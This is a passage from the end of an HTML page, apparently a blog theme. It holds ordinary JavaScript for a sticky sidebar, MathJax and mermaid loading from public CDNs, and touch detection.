    var affix;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');

    affix = $pageAside.affix({
      offsetBottom: $pageFooter.outerHeight(),
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      scroll: hasSidebar ? $('.js-page-main').children() : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      affix && affix.setOptions({
        disabled: tocDisabled
      });
    }, 100));

    window.pageAsideAffix = affix;
  });
})();
</script><script type="text/x-mathjax-config">
	var _config = { tex2jax: {
		inlineMath: [['$','$'], ['\\(','\\)']]
	}};MathJax.Hub.Config(_config);
</script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
<script>
  window.Lazyload.js('https://cdn.jsdelivr.net/npm/mermaid@8.0.0/dist/mermaid.min.js', function() {
    mermaid.initialize({
      startOnLoad: true
    });
    mermaid.init(undefined, '.language-mermaid');
  });
</script>

    </div>
    <script>(function () {
  var $root = document.getElementsByClassName('root')[0];
  if (window.hasEvent('touchstart')) {
    $root.dataset.isTouch = true;
    document.addEventListener('touchstart', function(){}, false);
  }
})();
</script>
  </body>
</html>

